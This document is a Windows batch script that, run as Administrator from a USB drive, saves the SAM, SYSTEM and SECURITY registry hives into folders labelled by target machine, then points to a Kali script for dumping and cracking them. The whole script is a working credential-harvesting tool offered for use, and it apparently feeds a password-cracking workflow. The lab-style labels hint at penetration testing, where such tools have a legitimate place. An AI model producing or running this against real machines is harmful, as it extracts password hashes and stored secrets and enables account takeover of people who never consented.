@echo off
REM dump_hives.cmd - Export SAM/SYSTEM/SECURITY to USB in per-target folders
REM Usage (run from Administrator CMD):
REM   G:\scripts\dump_hives.cmd
REM Notes:
REM   - Prompts for a Label (WIN10LAB, SERVER2019, etc.). Default = %COMPUTERNAME%.
REM   - Creates: \hives\<Label>\<YYYY-MM-DD_HH-MM-SS>\

REM --- Require Admin ---
net session >nul 2>&1
if errorlevel 1 (
  echo [!] Please run this from an Administrator Command Prompt.
  pause
  exit /b 1
)

setlocal ENABLEDELAYEDEXPANSION

REM --- Pick destination drive (this USB) ---
set DEST=%~d0
if not exist "%DEST%\hives\" (
  for %%D in (E F G H I J K L M N O P Q R S T U V W X Y Z) do (
    if exist "%%D:\hives\" set DEST=%%D: & goto :haveDest
  )
)
:haveDest
if "%DEST%"=="" (
  echo [!] Could not find a drive with \hives\. Create it and re-run.
  pause
  exit /b 1
)

REM --- Ask for target Label ---
set LABEL=
set /p LABEL=Enter target Label (default: %COMPUTERNAME%):
if "%LABEL%"=="" set LABEL=%COMPUTERNAME%

REM --- Timestamp ---
for /f %%a in ('wmic os get localdatetime ^| find "."') do set dt=%%a
set YYYY=%dt:~0,4%
set MM=%dt:~4,2%
set DD=%dt:~6,2%
set hh=%dt:~8,2%
set nn=%dt:~10,2%
set ss=%dt:~12,2%
set STAMP=%YYYY%-%MM%-%DD%_%hh%-%nn%-%ss%

set OUTDIR=%DEST%\hives\%LABEL%\%STAMP%
if not exist "%OUTDIR%" mkdir "%OUTDIR%"

echo [*] Destination: %OUTDIR%
echo [*] Saving hives (SAM, SYSTEM, SECURITY)...

reg save HKLM\SAM "%OUTDIR%\SAM.save" /y >nul 2>&1
if errorlevel 1 echo [!] SAM save failed

reg save HKLM\SYSTEM "%OUTDIR%\SYSTEM.save" /y >nul 2>&1
if errorlevel 1 echo [!] SYSTEM save failed

reg save HKLM\SECURITY "%OUTDIR%\SECURITY.save" /y >nul 2>&1
if errorlevel 1 echo [!] SECURITY save failed

echo.
echo [✓] Done. Files in %OUTDIR%:
dir /-c "%OUTDIR%"
echo.
echo Next (Kali):
echo   ./auto_hives_dump_and_crack.sh
echo   # results -> \results\%LABEL%\%STAMP%\
pause
